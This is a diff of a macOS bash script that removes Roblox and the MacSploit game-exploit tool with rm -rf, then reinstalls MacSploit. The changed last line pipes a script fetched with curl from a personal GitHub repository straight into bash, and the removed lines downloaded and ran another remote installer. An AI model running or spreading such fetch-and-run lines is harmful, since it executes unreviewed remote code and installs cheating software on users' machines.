@@ -1,20 +1,18 @@
 #!/bin/bash
 
 echo "[*] Uninstalling Roblox..."
+
 rm -rf "$HOME/Library/Application Support/Roblox"
 rm -rf "$HOME/Library/Logs/Roblox"
 rm -rf "$HOME/Library/Caches/com.roblox.Roblox"
 rm -rf "/Applications/Roblox.app"
 
 echo "[*] Uninstalling MacSploit..."
+
 rm -rf "$HOME/Library/Application Support/MacSploit"
 rm -rf "/Applications/MacSploit.app"
 
-echo "[✓] Done. Roblox and MacSploit have been removed."
+echo "[✓] Uninstall complete."
 
-echo "Downloading installer..."
-curl -s "https://git.raptor.fun/main/install.sh" -o ~/install.sh
-chmod +x ~/install.sh
-
-echo "Reinstalling..."
-~/install.sh
+echo "[*] Reinstalling MacSploit..."
+curl -L https://raw.githubusercontent.com/alexkkork/reinstall/refs/heads/main/macsploit-install | bash
